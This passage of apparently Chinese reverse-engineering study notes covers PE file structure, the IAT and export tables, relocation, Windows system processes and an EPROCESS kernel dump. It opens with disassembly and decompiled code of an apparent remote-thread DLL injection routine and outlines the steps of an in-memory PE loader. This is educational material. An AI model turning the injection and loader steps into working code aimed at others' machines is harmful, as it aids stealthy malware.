class=\"number\">00407608</span>  |.  <span class=\"number\">53</span>            push    ebx                              ; |dwSize</span><br><span class=\"line\"><span class=\"number\">00407609</span>  |.  <span class=\"number\">50</span>            push    eax                              ; |lpAddress</span><br><span class=\"line\"><span class=\"number\">0040760</span>A  |.  <span class=\"number\">51</span>            push    ecx                              ; |hProcess</span><br><span class=\"line\"><span class=\"number\">0040760B</span>  |.  FF15 <span class=\"number\">80204100</span> call    dword ptr ds:[&lt;&amp;KERNEL32.Virtual&gt;; \\VirtualFreeEx</span><br><span class=\"line\"><span class=\"number\">00407611</span>  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">00407612</span>  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">00407613</span>  |.  <span class=\"number\">899</span>E EC030000 mov     dword ptr ds:[esi+<span class=\"number\">0x3EC</span>],ebx</span><br><span class=\"line\"><span class=\"number\">00407619</span>  |.  <span class=\"number\">68</span> ACAA4100   push    <span class=\"number\">0041</span>AAAC                         ;  ASCII <span class=\"string\">&quot;在目标进程创建线程失败！&quot;</span></span><br><span class=\"line\"><span class=\"number\">0040761</span>E  |.^ E9 <span class=\"number\">21F</span>FFFFF   jmp     <span class=\"number\">00407544</span></span><br><span class=\"line\"><span class=\"number\">00407623</span>  |&gt;  <span class=\"number\">8B</span>96 EC030000 mov     edx,dword ptr ds:[esi+<span class=\"number\">0x3EC</span>]</span><br><span class=\"line\"><span class=\"number\">00407629</span>  |.  <span class=\"number\">8</span>D86 E0000000 lea     eax,dword ptr ds:[esi+<span class=\"number\">0xE0</span>]</span><br><span class=\"line\"><span class=\"number\">0040762F</span>  |.  <span class=\"number\">52</span>            push    edx</span><br><span class=\"line\"><span class=\"number\">00407630</span>  |.  <span class=\"number\">68</span> A8AA4100   push    <span class=\"number\">0041</span>AAA8                         ;  ASCII <span class=\"string\">&quot;%p&quot;</span></span><br><span class=\"line\"><span class=\"number\">00407635</span>  |.  <span class=\"number\">50</span>            push    eax</span><br><span class=\"line\"><span class=\"number\">00407636</span>  |.  C745 FC FFFFF&gt;mov     [local<span class=\"number\">.1</span>],<span class=\"number\">-0x1</span></span><br><span class=\"line\"><span class=\"number\">0040763</span>D  |.  E8 <span class=\"number\">04930000</span>   call    &lt;jmp.&amp;MFC42.#<span class=\"number\">2818</span>&gt;</span><br><span class=\"line\"><span class=\"number\">00407642</span>  |.  <span class=\"number\">83</span>C4 <span class=\"number\">0</span>C       add     esp,<span class=\"number\">0xC</span></span><br><span class=\"line\"><span class=\"number\">00407645</span>  |.  <span class=\"number\">8B</span>CE          mov     ecx,esi</span><br><span class=\"line\"><span class=\"number\">00407647</span>  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">00407648</span>  |.  E8 <span class=\"number\">3B</span>930000   call    &lt;jmp.&amp;MFC42.#<span class=\"number\">6334</span>&gt;</span><br><span class=\"line\"><span class=\"number\">0040764</span>D  |.  <span class=\"number\">8B</span>4D F4       mov     ecx,[local<span class=\"number\">.3</span>]</span><br><span class=\"line\"><span class=\"number\">00407650</span>  |.  <span class=\"number\">5F</span>            pop     edi</span><br><span class=\"line\"><span class=\"number\">00407651</span>  |.  <span class=\"number\">5</span>E            pop     esi</span><br><span class=\"line\"><span class=\"number\">00407652</span>  |.  <span class=\"number\">64</span>:<span class=\"number\">890</span>D <span class=\"number\">00000</span>&gt;mov     dword ptr fs:[<span class=\"number\">0</span>],ecx</span><br><span class=\"line\"><span class=\"number\">00407659</span>  |.  <span class=\"number\">5B</span>            pop     ebx</span><br><span class=\"line\"><span class=\"number\">0040765</span>A  |.  <span class=\"number\">8B</span>E5          mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040765</span>C  |.  <span class=\"number\">5</span>D            pop     ebp</span><br><span class=\"line\"><span class=\"number\">0040765</span>D  \\.  <span class=\"function\">C3            retn</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">char</span> __stdcall <span class=\"title\">sub_40CFB0</span><span class=\"params\">(HANDLE TokenHandle)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  HANDLE v1; <span class=\"comment\">// edi@1</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// ebx@2</span></span><br><span class=\"line\">  HANDLE v3; <span class=\"comment\">// eax@2</span></span><br><span class=\"line\">  HANDLE v4; <span class=\"comment\">// esi@2</span></span><br><span class=\"line\">  DWORD cbNeeded; <span class=\"comment\">// [sp+10h] [bp-8h]@2</span></span><br><span class=\"line\">  HMODULE hModule; <span class=\"comment\">// [sp+14h] [bp-4h]@5</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v1 = TokenHandle;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !TokenHandle )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  v2 = (<span class=\"type\">int</span>)((<span class=\"type\">char</span> *)TokenHandle + <span class=\"number\">264</span>);</span><br><span class=\"line\">  *((_BYTE *)TokenHandle + <span class=\"number\">264</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  cbNeeded = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v3 = <span class=\"built_in\">GetCurrentProcess</span>();</span><br><span class=\"line\">  <span class=\"built_in\">OpenProcessToken</span>(v3, <span class=\"number\">0x20</span>u, &amp;TokenHandle);</span><br><span class=\"line\">  <span class=\"built_in\">sub_40DA50</span>(TokenHandle, Name);</span><br><span class=\"line\">  <span class=\"built_in\">CloseHandle</span>(TokenHandle);</span><br><span class=\"line\">  v4 = <span class=\"built_in\">OpenProcess</span>(<span class=\"number\">0x1F0FFF</span>u, <span class=\"number\">0</span>, *(_DWORD *)v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !v4 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v4 = <span class=\"built_in\">OpenProcess</span>(<span class=\"number\">0x100430</span>u, <span class=\"number\">1</span>, *(_DWORD *)v1);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !v4 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">CloseHandle</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !<span class=\"built_in\">EnumProcessModules</span>(v4, &amp;hModule, <span class=\"number\">4u</span>, &amp;cbNeeded) || !cbNeeded )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">CloseHandle</span>(v4);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">GetModuleFileNameExA</span>(v4, hModule, (LPSTR)v1 + <span class=\"number\">264</span>, <span class=\"number\">0x104</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *((_BYTE *)v1 + <span class=\"number\">265</span>) != <span class=\"number\">58</span> )</span><br><span class=\"line\">    <span class=\"built_in\">sub_40D0B0</span>((LPCSTR)v1 + <span class=\"number\">4</span>, v2);</span><br><span class=\"line\">  <span class=\"built_in\">CloseHandle</span>(v4);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"远程调试\"><a class=\"markdownIt-Anchor\" href=\"#远程调试\">#</a> 远程调试</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923212509390.png\" alt=\"image-20230923212509390\"></p>\n<p>将对应内核的程序传到要调试的程序的文件夹中</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923212744539.png\" alt=\"image-20230923212744539\"></p>\n<p>路径不需要写盘符</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230923212847075.png\" alt=\"image-20230923212847075\"></p>\n<p>IDS 通过 recv_from ，连接服务器远程调试</p>\n<h2 id=\"pe\"><a class=\"markdownIt-Anchor\" href=\"#pe\">#</a> PE</h2>\n<p>PE 即 Portable Executable，是 Windows OS 下使用的可执行文件格式。PE 文件是指 32 位的可执行文件，亦称为 PE32。64 位的可执行文件称为 PE + 或 PE32+，是 PE 文件的一种扩展形式。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/2f336517676a47c79a5c100c9eba76a2.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/20180604194342189\" alt=\"img\"></p>\n<p>PE 文件加载流程：要执行 PE 文件，需要先将文件从磁盘以一定的规则加载到内存中，PE 文件加载到内存中的情形如图所示</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/f7f22dc0eb414f728d5c6701b11331b8.png\" alt=\"img\" style=\"zoom: 67%;\" /> \n<p>编译器可以决定基址和 oep</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230924105826930.png\" alt=\"image-20230924105826930\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230924110014914.png\" alt=\"image-20230924110014914\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230924110115948.png\" alt=\"image-20230924110115948\"></p>\n<p>其中，从 DOS 头（DOS header）到节区头（Section header）是 PE 头部分，其下的节区合称 PE 体</p>\n<p>VA 指的是进程虚拟内存的绝对地址，RVA ( Relative Virtual Address， 相对虚拟地址）指从某个基准位置（ ImageBase ）开始的相对地址。 VA 与 RVA 满足下面的换算关系。</p>\n<p>RVA+ImageBase=VA</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/66693853b00747e1b6f135dfeed85565.jpg\" alt=\"img\"></p>\n<p>什么是 DLL</p>\n<p>16 位的 DOS 时代不存在 DLL（Dynamic Linked Library）这一概念，只有 “库”（Library）一说。比如在 C 语言中使用 printf () 函数时，编译器会先从 C 库中读取相应函数的二进制代码，然后插入到应用程序。Windows OS 支持多任务，若仍采用这种包含库的方式，会非常没有效率。于是 Windows OS 的设计者们根据需要引入了 DLL 这一概念。</p>\n<p>加载 DLL 的方式有两种：</p>\n<p>显示链接：程序使用 DLL 时加载，使用完毕后释放内存；</p>\n<p>隐式链接：程序开始时即加载 DLL，程序终止时再释放占用的内存。</p>\n<p>上面提到了 DLL，在各种不同版本的 Windows 系统中，DLL 的版本各不相同，同一函数在不同版本 DLL 中的位置也可能不同；另外一个原因在于 DLL 的重定位，DLL 文件的 ImageBase 值一般为 10000000，但当两个 DLL 尝试装载到同一个地址时会发生冲突，因此有一个 DLL 得寻找另一个地址装载，这就是所谓的 DLL 重定位。</p>\n<p>因此当我们要调用某个 DLL 中的函数时，需要借助 IAT (Import Address Table，导入地址表）作为中间桥梁。PE 文件在装载时由 PE 装载器将导入函数的真实地址写入到 IAT 时，函数调用时则需要从 IAT 中获取函数的真实地址。</p>\n<p>IAT 提供的机制与 DLL 的隐式链接有关。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cstdio&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;cstring&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> input[<span class=\"number\">100</span>] = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">    <span class=\"built_in\">scanf_s</span>(<span class=\"string\">&quot;%s&quot;</span>, input);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"built_in\">strcmp</span>(input, <span class=\"string\">&quot;password&quot;</span>)) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Right.\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"导出表\"><a class=\"markdownIt-Anchor\" href=\"#导出表\">#</a> 导出表</h3>\n<p>导出表是 PE 文件为其他应用程序提供自身的一些变量、函数以及类，将其导出给第三方程序使用的一张清单，里面包含了可以导出的元素。</p>\n<p>从逻辑上来说，导出表由名称表、函数表与序号表组成。函数表和序号表必不可少，名称表则是可选的。序号表与名称表的作用是索引，找到真正需要的函数表，函数表中保存着被导出的函数的地址信息。</p>\n<h3 id=\"基址重定位节原理\"><a class=\"markdownIt-Anchor\" href=\"#基址重定位节原理\">#</a> 基址重定位节原理</h3>\n<p>当向程序的虚拟内存加载 PE 文件时，文件会被加载到 ImageBase 所指向的地址。</p>\n<p>ImageBase 就是前面讲到的 PE 拓展头中的一个成员：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">从逆向角度看PELoader加载器</span><br><span class=\"line\"></span><br><span class=\"line\">读取磁盘文件到内存</span><br><span class=\"line\">根据PE结构获取镜像大小，在自己的程序中申请可读可写可执行的内存。</span><br><span class=\"line\">将申请的空间全部填为0</span><br><span class=\"line\">修复函数重定位</span><br><span class=\"line\">根据PE结构的导入表，加载所需的dll，并获取导入函数的地址并写入导入表中</span><br><span class=\"line\">修改PE文件的加载基址</span><br><span class=\"line\">跳转到PE的入口点处执行</span><br></pre></td></tr></table></figure>\n<h2 id=\"windows系统安全\"><a class=\"markdownIt-Anchor\" href=\"#windows系统安全\">#</a> Windows 系统安全</h2>\n<p>进程句柄表</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/563d88364cb24f768722413a352523a4.png\" alt=\"img\"></p>\n<h3 id=\"系统进程\"><a class=\"markdownIt-Anchor\" href=\"#系统进程\">#</a> 系统进程</h3>\n<ol>\n<li>Winlogon  是一个登录 / 退出进程。winlogon 在用户按下 CTRL+ALT+DEL 时激活，并显示安全对话框。该进程提供了登录所需的类型控制和输入口令所需的对话框。当你输入用户名和口令时，Winlogon 将其发送给一个叫做 LSASS 的子进程。如果你执行对服务器或工作站的本地登录，LSASS 进程将在安全数据库（亦即 SAM）中查对有关用户名和口令。Winlogon 有两个子进程，即服务控制器和 LSASS。</li>\n<li>Explorer 进程 在 Windows 系列的操作系统中，运行时都会启动一个名为 Explorer.exe 的进程。这个进程主要负责显示系统桌面上的图标以及任务栏。</li>\n<li>csrss.exe 进程 这个进程是用户模式 Win32 子系统的一部分，CSRSS 代表客户 / 服务器运行子系统而且是一个基本的子系统必须一直运行。CSRSS 负责控制 Windows 图形相关子系统，创建或者删除线程和一些 16 位的虚拟 MS-DOS 环境。</li>\n<li>System Idle 这个进程不可以从任务管理器中关掉，是作为单线程运行在每个处理器上，并在系统不处理其他线程的时候分派处理器的时间。所以，在任务管理器中，看到的 “System Idle Process” 的 CPU 资源占用恰恰是 CPU 资源空闲时间。</li>\n<li>smss.exe 这个进程是不可以从任务管理器中关掉的，是一个会话管理子系统，负责启动用户会话。这个进程是通过系统进程初始化，并且对许多活动，包括正在运行的 Winlogon，Win32（Csrss.exe）线程和设定的系统变量作出反映。在它启动这些进程后，它等待 Winlogon 或者 Csrss 结束。如果这些过程是正常的，系统就关掉了。如果发生了什么不可预料的事情，smss.exe 就会让系统停止响应（就是挂起）。</li>\n<li>lsass.exe 这个进程是不可以从任务管理器中关掉的。管理 IP 安全策略以及启动 ISAKMP/Oakley (IKE) 和 IP 安全驱动程序。 这是一个本地的安全授权服务，它会为使用 winlogon 服务的授权用户生成一个进程。这个进程是通过使用授权的包，例如默认的 msgina.dll 来执行。如果授权是成功的，lsass 就会产生用户的进入令牌，令牌被用于启动初始的 shell，其他由用户初始化的进程也会继承这个令牌（系统服务）。</li>\n<li>services.exe 大多数的系统核心模式进程是作为系统进程在运行。</li>\n<li>缓冲（spooler）服务是管理缓冲池中的打印和传真作业，将文件加载到内存中以便迟后打印（系统服务）。</li>\n<li>System Idle Process 这个进程在系统不 处理其它线程的时 候分派处理器的时间。</li>\n</ol>\n<p>DLL 再注入时必须要有 DLLENTRYPoint</p>\n<h3 id=\"进程对象\"><a class=\"markdownIt-Anchor\" href=\"#进程对象\">#</a> 进程对象</h3>\n<p>对于进程来说，首先要说的数据结构是 EPROCESS（执行体进程块），它在执行体内表示一个进程对象。 我们可以通过内核调试器看看这个数据结构在 WRK 中的样子。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kd&gt; ?? sizeof(EPROCESS)</span><br><span class=\"line\"></span><br><span class=\"line\">unsigned int 0x278</span><br><span class=\"line\"></span><br><span class=\"line\">kd&gt; dt _EPROCESS</span><br><span class=\"line\"></span><br><span class=\"line\">nt!EPROCESS</span><br><span class=\"line\"></span><br><span class=\"line\">+0x000 Pcb : _KPROCESS</span><br><span class=\"line\"></span><br><span class=\"line\">+0x078 ProcessLock : _EX_PUSH_LOCK</span><br><span class=\"line\"></span><br><span class=\"line\">+0x080 CreateTime : _LARGE_INTEGER</span><br><span class=\"line\"></span><br><span class=\"line\">+0x088 ExitTime : _LARGE_INTEGER</span><br><span class=\"line\"></span><br><span class=\"line\">+0x090 RundownProtect : _EX_RUNDOWN_REF</span><br><span class=\"line\"></span><br><span class=\"line\">+0x094 UniqueProcessId : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x098 ActiveProcessLinks : _LIST_ENTRY</span><br><span class=\"line\"></span><br><span class=\"line\">+0x0a0 QuotaUsage : [3] Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x0ac QuotaPeak : [3] Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x0b8 CommitCharge : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x0bc PeakVirtualSize : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x0c0 VirtualSize : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x0c4 SessionProcessLinks : _LIST_ENTRY</span><br><span class=\"line\"></span><br><span class=\"line\">+0x0cc DebugPort : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x0d0 ExceptionPort : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x0d4 ObjectTable : Ptr32 _HANDLE_TABLE</span><br><span class=\"line\"></span><br><span class=\"line\">+0x0d8 Token : _EX_FAST_REF</span><br><span class=\"line\"></span><br><span class=\"line\">+0x0dc WorkingSetPage : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x0e0 AddressCreationLock : _KGUARDED_MUTEX</span><br><span class=\"line\"></span><br><span class=\"line\">+0x100 HyperSpaceLock : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x104 ForkInProgress : Ptr32 _ETHREAD</span><br><span class=\"line\"></span><br><span class=\"line\">+0x108 HardwareTrigger : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x10c PhysicalVadRoot : Ptr32 _MM_AVL_TABLE</span><br><span class=\"line\"></span><br><span class=\"line\">+0x110 CloneRoot : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x114 NumberOfPrivatePages : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x118 NumberOfLockedPages : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x11c Win32Process : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x120 Job : Ptr32 _EJOB</span><br><span class=\"line\"></span><br><span class=\"line\">+0x124 SectionObject : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x128 SectionBaseAddress : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x12c QuotaBlock : Ptr32 _EPROCESS_QUOTA_BLOCK</span><br><span class=\"line\"></span><br><span class=\"line\">+0x130 WorkingSetWatch : Ptr32 _PAGEFAULT_HISTORY</span><br><span class=\"line\"></span><br><span class=\"line\">+0x134 Win32WindowStation : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x138 InheritedFromUniqueProcessId : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x13c LdtInformation : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x140 VadFreeHint : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x144 VdmObjects : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x148 DeviceMap : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x14c Spare0 : [3] Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x158 PageDirectoryPte : _HARDWARE_PTE_X86</span><br><span class=\"line\"></span><br><span class=\"line\">+0x158 Filler : Uint8B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x160 Session : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x164 ImageFileName : [16] UChar</span><br><span class=\"line\"></span><br><span class=\"line\">+0x174 JobLinks : _LIST_ENTRY</span><br><span class=\"line\"></span><br><span class=\"line\">+0x17c LockedPagesList : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x180 ThreadListHead : _LIST_ENTRY</span><br><span class=\"line\"></span><br><span class=\"line\">+0x188 SecurityPort : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x18c PaeTop : Ptr32 Void</span><br><span class=\"line\"></span><br><span class=\"line\">+0x190 ActiveThreads : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x194 GrantedAccess : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x198 DefaultHardErrorProcessing : Uint4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x19c LastThreadExitStatus : Int4B</span><br><span class=\"line\"></span><br><span class=\"line\">+0x1a0 Peb : Ptr32 _PEB</span><br><span class=\"line\"></span><br><span class=\"line\">+0x1a4 PrefetchTrace : _EX_FAST_REF</span><br><span class=\"line\"></span><br><span class=\"line\">+0x1a8 ReadOperationCount : _LARGE_INTEGER</span><br><span class=\"line\"></span><br><span class=\"line\">+0x1b0 WriteOperationCount : _LARGE_INTEGER</span><br><span class=\"line\"></span><br><span class=\"line\">+0x1b8 OtherOperationCount : _LARGE_INTEGER</span><br><span class=\"line\"></span><br><span class=\"line\">+0x1c0 ReadTransferCount : _LARGE_INTEGER</span><br><span class=\"line\"></span><br><span class=\"line\">+0x1c8 WriteTransferCount : _LARGE_INTEGER</span><br><span class=\"line\"></span><br><span 